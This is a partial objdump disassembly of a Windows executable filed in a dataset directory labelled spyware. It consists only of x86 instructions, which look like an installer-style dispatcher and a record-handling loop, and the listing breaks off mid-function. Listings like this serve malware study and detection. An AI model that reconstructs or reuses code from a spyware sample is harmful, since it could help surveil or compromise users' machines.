
malware_samples/spyware/da289d2f2f50cbef9f9d6034e1a32e331c1b309f49c2e1e5029ec154e721af4c.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	55                   	push   %ebp
  401001:	8b ec                	mov    %esp,%ebp
  401003:	83 ec 5c             	sub    $0x5c,%esp
  401006:	83 7d 0c 0f          	cmpl   $0xf,0xc(%ebp)
  40100a:	74 2b                	je     0x401037
  40100c:	83 7d 0c 46          	cmpl   $0x46,0xc(%ebp)
  401010:	8b 45 14             	mov    0x14(%ebp),%eax
  401013:	75 0d                	jne    0x401022
  401015:	83 48 18 10          	orl    $0x10,0x18(%eax)
  401019:	8b 0d b4 b2 47 00    	mov    0x47b2b4,%ecx
  40101f:	89 48 04             	mov    %ecx,0x4(%eax)
  401022:	50                   	push   %eax
  401023:	ff 75 10             	push   0x10(%ebp)
  401026:	ff 75 0c             	push   0xc(%ebp)
  401029:	ff 75 08             	push   0x8(%ebp)
  40102c:	ff 15 7c 82 40 00    	call   *0x40827c
  401032:	e9 4b 01 00 00       	jmp    0x401182
  401037:	53                   	push   %ebx
  401038:	56                   	push   %esi
  401039:	8b 35 bc b2 47 00    	mov    0x47b2bc,%esi
  40103f:	57                   	push   %edi
  401040:	8d 45 a4             	lea    -0x5c(%ebp),%eax
  401043:	50                   	push   %eax
  401044:	ff 75 08             	push   0x8(%ebp)
  401047:	ff 15 80 82 40 00    	call   *0x408280
  40104d:	83 65 f4 00          	andl   $0x0,-0xc(%ebp)
  401051:	89 45 0c             	mov    %eax,0xc(%ebp)
  401054:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  401057:	50                   	push   %eax
  401058:	ff 75 08             	push   0x8(%ebp)
  40105b:	ff 15 84 82 40 00    	call   *0x408284
  401061:	8b 7d f0             	mov    -0x10(%ebp),%edi
  401064:	83 65 f0 00          	andl   $0x0,-0x10(%ebp)
  401068:	8b 1d 44 80 40 00    	mov    0x408044,%ebx
  40106e:	e9 89 00 00 00       	jmp    0x4010fc
  401073:	0f b6 46 52          	movzbl 0x52(%esi),%eax
  401077:	0f b6 56 56          	movzbl 0x56(%esi),%edx
  40107b:	0f af 55 e8          	imul   -0x18(%ebp),%edx
  40107f:	8b cf                	mov    %edi,%ecx
  401081:	2b 4d e8             	sub    -0x18(%ebp),%ecx
  401084:	0f af c1             	imul   %ecx,%eax
  401087:	03 c2                	add    %edx,%eax
  401089:	99                   	cltd
  40108a:	f7 ff                	idiv   %edi
  40108c:	89 4d 10             	mov    %ecx,0x10(%ebp)
  40108f:	0f b6 c0             	movzbl %al,%eax
  401092:	c1 e0 08             	shl    $0x8,%eax
  401095:	89 45 14             	mov    %eax,0x14(%ebp)
  401098:	0f b6 46 51          	movzbl 0x51(%esi),%eax
  40109c:	0f af c1             	imul   %ecx,%eax
  40109f:	0f b6 4e 55          	movzbl 0x55(%esi),%ecx
  4010a3:	0f af 4d e8          	imul   -0x18(%ebp),%ecx
  4010a7:	03 c1                	add    %ecx,%eax
  4010a9:	99                   	cltd
  4010aa:	f7 ff                	idiv   %edi
  4010ac:	8b 4d 14             	mov    0x14(%ebp),%ecx
  4010af:	0f b6 56 54          	movzbl 0x54(%esi),%edx
  4010b3:	0f af 55 e8          	imul   -0x18(%ebp),%edx
  4010b7:	0f b6 c0             	movzbl %al,%eax
  4010ba:	0b c8                	or     %eax,%ecx
  4010bc:	0f b6 46 50          	movzbl 0x50(%esi),%eax
  4010c0:	0f af 45 10          	imul   0x10(%ebp),%eax
  4010c4:	03 c2                	add    %edx,%eax
  4010c6:	99                   	cltd
  4010c7:	f7 ff                	idiv   %edi
  4010c9:	c1 e1 08             	shl    $0x8,%ecx
  4010cc:	0f b6 c0             	movzbl %al,%eax
  4010cf:	0b c8                	or     %eax,%ecx
  4010d1:	8d 45 f4             	lea    -0xc(%ebp),%eax
  4010d4:	50                   	push   %eax
  4010d5:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  4010d8:	ff 15 48 80 40 00    	call   *0x408048
  4010de:	83 45 f0 04          	addl   $0x4,-0x10(%ebp)
  4010e2:	50                   	push   %eax
  4010e3:	89 45 14             	mov    %eax,0x14(%ebp)
  4010e6:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  4010e9:	50                   	push   %eax
  4010ea:	ff 75 0c             	push   0xc(%ebp)
  4010ed:	ff 15 88 82 40 00    	call   *0x408288
  4010f3:	ff 75 14             	push   0x14(%ebp)
  4010f6:	ff d3                	call   *%ebx
  4010f8:	83 45 e8 04          	addl   $0x4,-0x18(%ebp)
  4010fc:	39 7d e8             	cmp    %edi,-0x18(%ebp)
  4010ff:	0f 8c 6e ff ff ff    	jl     0x401073
  401105:	83 7e 58 ff          	cmpl   $0xffffffff,0x58(%esi)
  401109:	74 65                	je     0x401170
  40110b:	ff 76 34             	push   0x34(%esi)
  40110e:	ff 15 4c 80 40 00    	call   *0x40804c
  401114:	89 45 14             	mov    %eax,0x14(%ebp)
  401117:	85 c0                	test   %eax,%eax
  401119:	74 55                	je     0x401170
  40111b:	8b 7d 0c             	mov    0xc(%ebp),%edi
  40111e:	6a 01                	push   $0x1
  401120:	57                   	push   %edi
  401121:	c7 45 e4 10 00 00 00 	movl   $0x10,-0x1c(%ebp)
  401128:	c7 45 e8 08 00 00 00 	movl   $0x8,-0x18(%ebp)
  40112f:	ff 15 50 80 40 00    	call   *0x408050
  401135:	ff 76 58             	push   0x58(%esi)
  401138:	57                   	push   %edi
  401139:	ff 15 54 80 40 00    	call   *0x408054
  40113f:	ff 75 14             	push   0x14(%ebp)
  401142:	8b 35 58 80 40 00    	mov    0x408058,%esi
  401148:	57                   	push   %edi
  401149:	ff d6                	call   *%esi
  40114b:	68 20 08 00 00       	push   $0x820
  401150:	89 45 0c             	mov    %eax,0xc(%ebp)
  401153:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  401156:	50                   	push   %eax
  401157:	6a ff                	push   $0xffffffff
  401159:	68 a0 32 47 00       	push   $0x4732a0
  40115e:	57                   	push   %edi
  40115f:	ff 15 8c 82 40 00    	call   *0x40828c
  401165:	ff 75 0c             	push   0xc(%ebp)
  401168:	57                   	push   %edi
  401169:	ff d6                	call   *%esi
  40116b:	ff 75 14             	push   0x14(%ebp)
  40116e:	ff d3                	call   *%ebx
  401170:	8d 45 a4             	lea    -0x5c(%ebp),%eax
  401173:	50                   	push   %eax
  401174:	ff 75 08             	push   0x8(%ebp)
  401177:	ff 15 90 82 40 00    	call   *0x408290
  40117d:	5f                   	pop    %edi
  40117e:	5e                   	pop    %esi
  40117f:	33 c0                	xor    %eax,%eax
  401181:	5b                   	pop    %ebx
  401182:	c9                   	leave
  401183:	c2 10 00             	ret    $0x10
  401186:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  40118a:	a1 c8 b2 47 00       	mov    0x47b2c8,%eax
  40118f:	8b d1                	mov    %ecx,%edx
  401191:	69 d2 20 40 00 00    	imul   $0x4020,%edx,%edx
  401197:	8b 54 02 08          	mov    0x8(%edx,%eax,1),%edx
  40119b:	f6 c2 02             	test   $0x2,%dl
  40119e:	74 55                	je     0x4011f5
  4011a0:	56                   	push   %esi
  4011a1:	57                   	push   %edi
  4011a2:	8d 71 01             	lea    0x1(%ecx),%esi
  4011a5:	33 ff                	xor    %edi,%edi
  4011a7:	3b 35 cc b2 47 00    	cmp    0x47b2cc,%esi
  4011ad:	73 44                	jae    0x4011f3
  4011af:	8b ce                	mov    %esi,%ecx
  4011b1:	69 c9 20 40 00 00    	imul   $0x4020,%ecx,%ecx
  4011b7:	8d 44 01 08          	lea    0x8(%ecx,%eax,1),%eax
  4011bb:	53                   	push   %ebx
  4011bc:	8b 08                	mov    (%eax),%ecx
  4011be:	f6 c1 02             	test   $0x2,%cl
  4011c1:	74 03                	je     0x4011c6
  4011c3:	47                   	inc    %edi
  4011c4:	eb 1e                	jmp    0x4011e4
  4011c6:	f6 c1 04             	test   $0x4,%cl
  4011c9:	74 09                	je     0x4011d4
  4011cb:	8b cf                	mov    %edi,%ecx
  4011cd:	4f                   	dec    %edi
  4011ce:	85 c9                	test   %ecx,%ecx
  4011d0:	74 20                	je     0x4011f2
  4011d2:	eb 10                	jmp    0x4011e4
  4011d4:	f6 c1 10             	test   $0x10,%cl
  4011d7:	75 0b                	jne    0x4011e4
  4011d9:	8b d9                	mov    %ecx,%ebx
  4011db:	33 da                	xor    %edx,%ebx
  4011dd:	83 e3 01             	and    $0x1,%ebx
  4011e0:	33 d9                	xor    %ecx,%ebx
  4011e2:	89 18                	mov    %ebx,(%eax)
  4011e4:	46                   	inc    %esi
  4011e5:	05 20 40 00 00       	add    $0x4020,%eax
  4011ea:	3b 35 cc b2 47 00    	cmp    0x47b2cc,%esi
  4011f0:	72 ca                	jb     0x4011bc
  4011f2:	5b                   	pop    %ebx
  4011f3:	5f                   	pop    %edi
  4011f4:	5e                   	pop    %esi
  4011f5:	c2 04 00             	ret    $0x4
  4011f8:	55                   	push   %ebp
  4011f9:	8b ec                	mov    %esp,%ebp
  4011fb:	51                   	push   %ecx
  4011fc:	51                   	push   %ecx
  4011fd:	8b 55 08             	mov    0x8(%ebp),%edx
  401200:	53                   	push   %ebx
  401201:	8b 1d c8 b2 47 00    	mov    0x47b2c8,%ebx
  401207:	56                   	push   %esi
  401208:	8b f2                	mov    %edx,%esi
  40120a:	69 f6 20 40 00 00    	imul   $0x4020,%esi,%esi
  401210:	03 f3                	add    %ebx,%esi
  401212:	8b 46 08             	mov    0x8(%esi),%eax
  401215:	33 c9                	xor    %ecx,%ecx
  401217:	57                   	push   %edi
  401218:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  40121b:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  40121e:	a8 02                	test   $0x2,%al
  401220:	74 0c                	je     0x40122e
  401222:	39 4d 0c             	cmp    %ecx,0xc(%ebp)
  401225:	74 07                	je     0x40122e
  401227:	83 e0 be             	and    $0xffffffbe,%eax
  40122a:	89 46 08             	mov    %eax,0x8(%esi)
  40122d:	42                   	inc    %edx
  40122e:	3b 15 cc b2 47 00    	cmp    0x47b2cc,%edx
  401234:	73 44                	jae    0x40127a
  401236:	8b c2                	mov    %edx,%eax
  401238:	69 c0 20 40 00 00    	imul   $0x4020,%eax,%eax
  40123e:	8d 7c 18 08          	lea    0x8(%eax,%ebx,1),%edi
  401242:	8b 0f                	mov    (%edi),%ecx
  401244:	8d 42 01             	lea    0x1(%edx),%eax
  401247:	f6 c1 02             	test   $0x2,%cl
  40124a:	74 0a                	je     0x401256
  40124c:	6a 01                	push   $0x1
  40124e:	52                   	push   %edx
  40124f:	e8 a4 ff ff ff       	call   0x4011f8
  401254:	8b 0f                	mov    (%edi),%ecx
  401256:	f6 c1 04             	test   $0x4,%cl
  401259:	75 28                	jne    0x401283
  40125b:	f6 c1 40             	test   $0x40,%cl
  40125e:	74 03                	je     0x401263
  401260:	ff 45 fc             	incl   -0x4(%ebp)
  401263:	f6 c1 01             	test   $0x1,%cl
  401266:	74 05                	je     0x40126d
  401268:	ff 45 fc             	incl   -0x4(%ebp)
  40126b:	eb 03                	jmp    0x401270
  40126d:	ff 45 f8             	incl   -0x8(%ebp)
  401270:	8b d0                	mov    %eax,%edx
  401272:	3b 05 cc b2 47 00    	cmp    0x47b2cc,%eax
  401278:	72 bc                	jb     0x401236
  40127a:	33 c0                	xor    %eax,%eax
  40127c:	5f                   	pop    %edi
  40127d:	5e                   	pop    %esi
  40127e:	5b                   	pop    %ebx
  40127f:	c9                   	leave
  401280:	c2 08 00             	ret    $0x8
  401283:	83 7d fc 00          	cmpl   $0x0,-0x4(%ebp)
  401287:	74 f3                	je     0x40127c
  401289:	83 7d f8 00          	cmpl   $0x0,-0x8(%ebp)
  40128d:	74 06                	je     0x401295
  40128f:	83 4e 08 40          	orl    $0x40,0x8(%esi)
  401293:	eb e7                	jmp    0x40127c
  401295:	8b 4e 08             	mov    0x8(%esi),%ecx
  401298:	81 e1 7f ff ff ff    	and    $0xffffff7f,%ecx
  40129e:	83 c9 01             	or     $0x1,%ecx
  4012a1:	89 4e 08             	mov    %ecx,0x8(%esi)
  4012a4:	eb d6                	jmp    0x40127c
  4012a6:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  4012aa:	a1 c8 b2 47 00       	mov    0x47b2c8,%eax
  4012af:	56                   	push   %esi
  4012b0:	33 f6                	xor    %esi,%esi
  4012b2:	83 f9 20             	cmp    $0x20,%ecx
  4012b5:	73 36                	jae    0x4012ed
  4012b7:	39 35 cc b2 47 00    	cmp    %esi,0x47b2cc
  4012bd:	76 2e                	jbe    0x4012ed
  4012bf:	8d 50 08             	lea    0x8(%eax),%edx
  4012c2:	57                   	push   %edi
  4012c3:	8b 02                	mov    (%edx),%eax
  4012c5:	a8 06                	test   $0x6,%al
  4012c7:	75 14                	jne    0x4012dd
  4012c9:	33 ff                	xor    %edi,%edi
  4012cb:	47                   	inc    %edi
  4012cc:	d3 e7                	shl    %cl,%edi
  4012ce:	85 7a fc             	test   %edi,-0x4(%edx)
  4012d1:	74 05                	je     0x4012d8
  4012d3:	83 c8 01             	or     $0x1,%eax
  4012d6:	eb 03                	jmp    0x4012db
  4012d8:	83 e0 fe             	and    $0xfffffffe,%eax
  4012db:	89 02                	mov    %eax,(%edx)
  4012dd:	46                   	inc    %esi
  4012de:	81 c2 20 40 00 00    	add    $0x4020,%edx
  4012e4:	3b 35 cc b2 47 00    	cmp    0x47b2cc,%esi
  4012ea:	72 d7                	jb     0x4012c3
  4012ec:	5f                   	pop    %edi
  4012ed:	5e                   	pop    %esi
  4012ee:	c2 04 00             	ret    $0x4
  4012f1:	55                   	push   %ebp
  4012f2:	8b ec                	mov    %esp,%ebp
  4012f4:	83 ec 0c             	sub    $0xc,%esp
  4012f7:	a1 bc b2 47 00       	mov    0x47b2bc,%eax
  4012fc:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  401300:	53                   	push   %ebx
  401301:	56                   	push   %esi
  401302:	05 94 00 00 00       	add    $0x94,%eax
  401307:	57                   	push   %edi
  401308:	8b 3d cc b2 47 00    	mov    0x47b2cc,%edi
  40130e:	89 45 f8             	mov    %eax,-0x8(%ebp)
  401311:	8b 45 f8             	mov    -0x8(%ebp),%eax
  401314:	33 db                	xor    %ebx,%ebx
  401316:	39 18                	cmp    %ebx,(%eax)
  401318:	74 4b                	je     0x401365
  40131a:	3b df                	cmp    %edi,%ebx
  40131c:	73 45                	jae    0x401363
  40131e:	8b 35 c8 b2 47 00    	mov    0x47b2c8,%esi
  401324:	83 c6 08             	add    $0x8,%esi
  401327:	8b 16                	mov    (%esi),%edx
  401329:	f6 c2 06             	test   $0x6,%dl
  40132c:	75 28                	jne    0x401356
  40132e:	8b 45 08             	mov    0x8(%ebp),%eax
  401331:	85 c0                	test   %eax,%eax
  401333:	74 06                	je     0x40133b
  401335:	83 3c 98 00          	cmpl   $0x0,(%eax,%ebx,4)
  401339:	74 1b                	je     0x401356
  40133b:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40133e:	33 c0                	xor    %eax,%eax
  401340:	40                   	inc    %eax
  401341:	d3 e0                	shl    %cl,%eax
  401343:	8b 4e fc             	mov    -0x4(%esi),%ecx
  401346:	83 e2 01             	and    $0x1,%edx
  401349:	23 c8                	and    %eax,%ecx
  40134b:	8b c1                	mov    %ecx,%eax
  40134d:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  401350:	d3 e2                	shl    %cl,%edx
  401352:	3b c2                	cmp    %edx,%eax
  401354:	75 0b                	jne    0x401361
  401356:	43                   	inc    %ebx
  401357:	81 c6 20 40 00 00    	add    $0x4020,%esi
  40135d:	3b df                	cmp    %edi,%ebx
  40135f:	72 c6                	jb     0x401327
  401361:	3b df                	cmp    %edi,%ebx
  401363:	74 0d                	je     0x401372
  401365:	ff 45 fc             	incl   -0x4(%ebp)
  401368:	83 45 f8 04          	addl   $0x4,-0x8(%ebp)
  40136c:	83 7d fc 20          	cmpl   $0x20,-0x4(%ebp)
  401370:	72 9f                	jb     0x401311
  401372:	8b 45 fc             	mov    -0x4(%ebp),%eax
  401375:	5f                   	pop    %edi
  401376:	5e                   	pop    %esi
  401377:	5b                   	pop    %ebx
  401378:	c9                   	leave
  401379:	c2 04 00             	ret    $0x4
  40137c:	8b 44 24 04          	mov    0x4(%esp),%eax
  401380:	85 c0                	test   %eax,%eax
  401382:	7d 14                	jge    0x401398
  401384:	40                   	inc    %eax
  401385:	69 c0 08 40 00 00    	imul   $0x4008,%eax,%eax
  40138b:	b9 00 c0 47 00       	mov    $0x47c000,%ecx
  401390:	2b c8                	sub    %eax,%ecx
  401392:	51                   	push   %ecx
  401393:	e8 e3 47 00 00       	call   0x405b7b
  401398:	c2 04 00             	ret    $0x4
  40139b:	56                   	push   %esi
  40139c:	8b 74 24 08          	mov    0x8(%esp),%esi
  4013a0:	eb 6a                	jmp    0x40140c
  4013a2:	8b 0d d0 b2 47 00    	mov    0x47b2d0,%ecx
  4013a8:	8b c6                	mov    %esi,%eax
  4013aa:	6b c0 1c             	imul   $0x1c,%eax,%eax
  4013ad:	03 c1                	add    %ecx,%eax
  4013af:	83 38 01             	cmpl   $0x1,(%eax)
  4013b2:	74 5c                	je     0x401410
  4013b4:	50                   	push   %eax
  4013b5:	e8 e2 01 00 00       	call   0x40159c
  4013ba:	3d ff ff ff 7f       	cmp    $0x7fffffff,%eax
  4013bf:	74 55                	je     0x401416
  4013c1:	50                   	push   %eax
  4013c2:	e8 b5 ff ff ff       	call   0x40137c
  4013c7:	85 c0                	test   %eax,%eax
  4013c9:	75 04                	jne    0x4013cf
  4013cb:	40                   	inc    %eax
  4013cc:	46                   	inc    %esi
  4013cd:	eb 07                	jmp    0x4013d6
  4013cf:	48                   	dec    %eax
  4013d0:	8b ce                	mov    %esi,%ecx
  4013d2:	8b f0                	mov    %eax,%esi
  4013d4:	2b c1                	sub    %ecx,%eax
  4013d6:	83 7c 24 0c 00       	cmpl   $0x0,0xc(%esp)
  4013db:	74 2f                	je     0x40140c
  4013dd:	01 05 8c 32 47 00    	add    %eax,0x47328c
  4013e3:	6a 00                	push   $0x0
  4013e5:	ff 35 84 32 47 00    	push   0x473284
  4013eb:	68 30 75 00 00       	push   $0x7530
  4013f0:	ff 35 8c 32 47 00    	push   0x47328c
  4013f6:	ff 15 48 81 40 00    	call   *0x408148
  4013fc:	50                   	push   %eax
  4013fd:	68 02 04 00 00       	push   $0x402
  401402:	ff 74 24 18          	push   0x18(%esp)
  401406:	ff 15 78 82 40 00    	call   *0x408278
  40140c:	85 f6                	test   %esi,%esi
  40140e:	7d 92                	jge    0x4013a2
  401410:	33 c0                	xor    %eax,%eax
  401412:	5e                   	pop    %esi
  401413:	c2 08 00             	ret    $0x8
  401416:	b8 ff ff ff 7f       	mov    $0x7fffffff,%eax
  40141b:	eb f5                	jmp    0x401412
  40141d:	8b 44 24 04          	mov    0x4(%esp),%eax
  401421:	8b 0d bc b2 47 00    	mov    0x47b2bc,%ecx
  401427:	6a 00                	push   $0x0
  401429:	ff 74 81 6c          	push   0x6c(%ecx,%eax,4)
  40142d:	e8 69 ff ff ff       	call   0x40139b
  401432:	c2 04 00             	ret    $0x4
  401435:	68 f0 e0 40 00       	push   $0x40e0f0
  40143a:	ff 74 24 08          	push   0x8(%esp)
  40143e:	e8 93 37 00 00       	call   0x404bd6
  401443:	c2 04 00             	ret    $0x4
  401446:	a1 e4 a0 40 00       	mov    0x40a0e4,%eax
  40144b:	ff 34 88             	push   (%eax,%ecx,4)
  40144e:	6a 00                	push   $0x0
  401450:	e8 d8 4d 00 00       	call   0x40622d
  401455:	50                   	push   %eax
  401456:	e8 20 47 00 00       	call   0x405b7b
  40145b:	c3                   	ret
  40145c:	8b c6                	mov    %esi,%eax
  40145e:	85 f6                	test   %esi,%esi
  401460:	7d 02                	jge    0x401464
  401462:	f7 d8                	neg    %eax
  401464:	8b 15 e4 a0 40 00    	mov    0x40a0e4,%edx
  40146a:	8b c8                	mov    %eax,%ecx
  40146c:	c1 f8 04             	sar    $0x4,%eax
  40146f:	69 c0 08 40 00 00    	imul   $0x4008,%eax,%eax
  401475:	57                   	push   %edi
  401476:	83 e1 0f             	and    $0xf,%ecx
  401479:	ff 34 8a             	push   (%edx,%ecx,4)
  40147c:	05 e8 a0 40 00       	add    $0x40a0e8,%eax
  401481:	50                   	push   %eax
  401482:	e8 a6 4d 00 00       	call   0x40622d
  401487:	8b f8                	mov    %eax,%edi
  401489:	85 f6                	test   %esi,%esi
  40148b:	7d 06                	jge    0x401493
  40148d:	57                   	push   %edi
  40148e:	e8 b7 47 00 00       	call   0x405c4a
  401493:	8b c7                	mov    %edi,%eax
  401495:	5f                   	pop    %edi
  401496:	c3                   	ret
  401497:	55                   	push   %ebp
  401498:	8b ec                	mov    %esp,%ebp
  40149a:	81 ec 10 02 00 00    	sub    $0x210,%esp
  4014a0:	53                   	push   %ebx
  4014a1:	56                   	push   %esi
  4014a2:	57                   	push   %edi
  4014a3:	8d 45 fc             	lea    -0x4(%ebp),%eax
  4014a6:	50                   	push   %eax
  4014a7:	a1 90 b3 47 00       	mov    0x47b390,%eax
  4014ac:	83 c8 08             	or     $0x8,%eax
  4014af:	50                   	push   %eax
  4014b0:	33 db                	xor    %ebx,%ebx
  4014b2:	53                   	push   %ebx
  4014b3:	ff 75 0c             	push   0xc(%ebp)
  4014b6:	ff 75 08             	push   0x8(%ebp)
  4014b9:	ff 15 04 80 40 00    	call   *0x408004
  4014bf:	3b c3                	cmp    %ebx,%eax
  4014c1:	75 69                	jne    0x40152c
  4014c3:	8b 35 00 80 40 00    	mov    0x408000,%esi
  4014c9:	bf 05 01 00 00       	mov    $0x105,%edi
  4014ce:	eb 19                	jmp    0x4014e9
  4014d0:	39 5d 10             	cmp    %ebx,0x10(%ebp)
  4014d3:	75 4b                	jne    0x401520
  4014d5:	53                   	push   %ebx
  4014d6:	8d 85 f0 fd ff ff    	lea    -0x210(%ebp),%eax
  4014dc:	50                   	push   %eax
  4014dd:	ff 75 fc             	push   -0x4(%ebp)
  4014e0:	e8 b2 ff ff ff       	call   0x401497
  4014e5:	85 c0                	test   %eax,%eax
  4014e7:	75 12                	jne    0x4014fb
  4014e9:	57                   	push   %edi
  4014ea:	8d 85 f0 fd ff ff    	lea    -0x210(%ebp),%eax
  4014f0:	50                   	push   %eax
  4014f1:	53                   	push   %ebx
  4014f2:	ff 75 fc             	push   -0x4(%ebp)
  4014f5:	ff d6                	call   *%esi
  4014f7:	85 c0                	test   %eax,%eax
  4014f9:	74 d5                	je     0x4014d0
  4014fb:	ff 75 fc             	push   -0x4(%ebp)
  4014fe:	ff 15 08 80 40 00    	call   *0x408008
  401504:	6a 02                	push   $0x2
  401506:	e8 17 48 00 00       	call   0x405d22
  40150b:	3b c3                	cmp    %ebx,%eax
  40150d:	74 24                	je     0x401533
  40150f:	53                   	push   %ebx
  401510:	ff 35 90 b3 47 00    	push   0x47b390
  401516:	ff 75 0c             	push   0xc(%ebp)
  401519:	ff 75 08             	push   0x8(%ebp)
  40151c:	ff d0                	call   *%eax
  40151e:	eb 0c                	jmp    0x40152c
  401520:	ff 75 fc             	push   -0x4(%ebp)
  401523:	ff 15 08 80 40 00    	call   *0x408008
  401529:	33 c0                	xor    %eax,%eax
  40152b:	40                   	inc    %eax
  40152c:	5f                   	pop    %edi
  40152d:	5e                   	pop    %esi
  40152e:	5b                   	pop    %ebx
  40152f:	c9                   	leave
  401530:	c2 0c 00             	ret    $0xc
  401533:	39 1d 90 b3 47 00    	cmp    %ebx,0x47b390
  401539:	75 ee                	jne    0x401529
  40153b:	ff 75 0c             	push   0xc(%ebp)
  40153e:	ff 75 08             	push   0x8(%ebp)
  401541:	ff 15 0c 80 40 00    	call   *0x40800c
  401547:	85 c0                	test   %eax,%eax
  401549:	75 de                	jne    0x401529
  40154b:	eb df                	jmp    0x40152c
  40154d:	55                   	push   %ebp
  40154e:	8b ec                	mov    %esp,%ebp
  401550:	a1 e4 a0 40 00       	mov    0x40a0e4,%eax
  401555:	8b 40 04             	mov    0x4(%eax),%eax
  401558:	56                   	push   %esi
  401559:	57                   	push   %edi
  40155a:	85 c0                	test   %eax,%eax
  40155c:	74 04                	je     0x401562
  40155e:	8b f8                	mov    %eax,%edi
  401560:	eb 0c                	jmp    0x40156e
  401562:	8b 3d 64 b3 47 00    	mov    0x47b364,%edi
  401568:	81 c7 01 00 00 80    	add    $0x80000001,%edi
  40156e:	8d 45 08             	lea    0x8(%ebp),%eax
  401571:	50                   	push   %eax
  401572:	a1 90 b3 47 00       	mov    0x47b390,%eax
  401577:	0b 45 08             	or     0x8(%ebp),%eax
  40157a:	50                   	push   %eax
  40157b:	6a 00                	push   $0x0
  40157d:	6a 22                	push   $0x22
  40157f:	5e                   	pop    %esi
  401580:	e8 d7 fe ff ff       	call   0x40145c
  401585:	50                   	push   %eax
  401586:	57                   	push   %edi
  401587:	ff 15 04 80 40 00    	call   *0x408004
  40158d:	f7 d8                	neg    %eax
  40158f:	1b c0                	sbb    %eax,%eax
  401591:	f7 d0                	not    %eax
  401593:	23 45 08             	and    0x8(%ebp),%eax
  401596:	5f                   	pop    %edi
  401597:	5e                   	pop    %esi
  401598:	5d                   	pop    %ebp
  401599:	c2 04 00             	ret    $0x4
  40159c:	55                   	push   %ebp
  40159d:	8b ec                	mov    %esp,%ebp
  40159f:	81 ec a4 02 00 00    	sub    $0x2a4,%esp
  4015a5:	a1 b4 b2 47 00       	mov    0x47b2b4,%eax
  4015aa:	53                   	push   %ebx
  4015ab:	56                   	push   %esi
  4015ac:	8b 75 08             	mov    0x8(%ebp),%esi
  4015af:	57                   	push   %edi
  4015b0:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  4015b4:	6a 07                	push   $0x7
  4015b6:	59                   	pop    %ecx
  4015b7:	8d 7d d8             	lea    -0x28(%ebp),%edi
  4015ba:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  4015bc:	8b 55 e0             	mov    -0x20(%ebp),%edx
  4015bf:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4015c2:	8b 45 dc             	mov    -0x24(%ebp),%eax
  4015c5:	8b f8                	mov    %eax,%edi
  4015c7:	8b da                	mov    %edx,%ebx
  4015c9:	69 ff 08 40 00 00    	imul   $0x4008,%edi,%edi
  4015cf:	69 db 08 40 00 00    	imul   $0x4008,%ebx,%ebx
  4015d5:	b9 00 c0 47 00       	mov    $0x47c000,%ecx
  4015da:	03 f9                	add    %ecx,%edi
  4015dc:	03 d9                	add    %ecx,%ebx
  4015de:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  4015e1:	89 0d e4 a0 40 00    	mov    %ecx,0x40a0e4
  4015e7:	8b 4d d8             	mov    -0x28(%ebp),%ecx
  4015ea:	83 c1 fe             	add    $0xfffffffe,%ecx
  4015ed:	83 f9 44             	cmp    $0x44,%ecx
  4015f0:	0f 87 62 16 00 00    	ja     0x402c58
  4015f6:	ff 24 8d 6c 2c 40 00 	jmp    *0x402c6c(,%ecx,4)
  4015fd:	6a 00                	push   $0x0
  4015ff:	50                   	push   %eax
  401600:	e8 d1 35 00 00       	call   0x404bd6
  401605:	b8 ff ff ff 7f       	mov    $0x7fffffff,%eax
  40160a:	e9 54 16 00 00       	jmp    0x402c63
  40160f:	ff 05 74 32 47 00    	incl   0x473274
  401615:	83 7d f8 00          	cmpl   $0x0,-0x8(%ebp)
  401619:	74 ea                	je     0x401605
  40161b:	6a 00                	push   $0x0
  40161d:	ff 15 2c 82 40 00    	call   *0x40822c
  401623:	eb e0                	jmp    0x401605
  401625:	50                   	push   %eax
  401626:	e8 51 fd ff ff       	call   0x40137c
  40162b:	48                   	dec    %eax
  40162c:	6a 00                	push   $0x0
  40162e:	50                   	push   %eax
  40162f:	e8 67 fd ff ff       	call   0x40139b
  401634:	e9 2a 16 00 00       	jmp    0x402c63
  401639:	6a 00                	push   $0x0
  40163b:	50                   	push   %eax
  40163c:	e8 95 35 00 00       	call   0x404bd6
  401641:	e9 12 16 00 00       	jmp    0x402c58
  401646:	33 c9                	xor    %ecx,%ecx
  401648:	e8 f9 fd ff ff       	call   0x401446
  40164d:	83 f8 01             	cmp    $0x1,%eax
  401650:	7f 03                	jg     0x401655
  401652:	33 c0                	xor    %eax,%eax
  401654:	40                   	inc    %eax
  401655:	50                   	push   %eax
  401656:	ff 15 8c 80 40 00    	call   *0x40808c
  40165c:	e9 f7 15 00 00       	jmp    0x402c58
  401661:	ff 75 f8             	push   -0x8(%ebp)
  401664:	ff 15 30 82 40 00    	call   *0x408230
  40166a:	e9 e9 15 00 00       	jmp    0x402c58
  40166f:	c1 e0 02             	shl    $0x2,%eax
  401672:	83 7d e4 00          	cmpl   $0x0,-0x1c(%ebp)
  401676:	75 23                	jne    0x40169b
  401678:	8b 88 60 b3 47 00    	mov    0x47b360(%eax),%ecx
  40167e:	89 88 20 b3 47 00    	mov    %ecx,0x47b320(%eax)
  401684:	33 c9                	xor    %ecx,%ecx
  401686:	41                   	inc    %ecx
  401687:	e8 ba fd ff ff       	call   0x401446
  40168c:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  40168f:	89 04 8d 60 b3 47 00 	mov    %eax,0x47b360(,%ecx,4)
  401696:	e9 bd 15 00 00       	jmp    0x402c58
  40169b:	8b 88 20 b3 47 00    	mov    0x47b320(%eax),%ecx
  4016a1:	89 88 60 b3 47 00    	mov    %ecx,0x47b360(%eax)
  4016a7:	e9 ac 15 00 00       	jmp    0x402c58
  4016ac:	8b 55 e4             	mov    -0x1c(%ebp),%edx
  4016af:	8d 14 95 60 b3 47 00 	lea    0x47b360(,%edx,4),%edx
  4016b6:	8b 0a                	mov    (%edx),%ecx
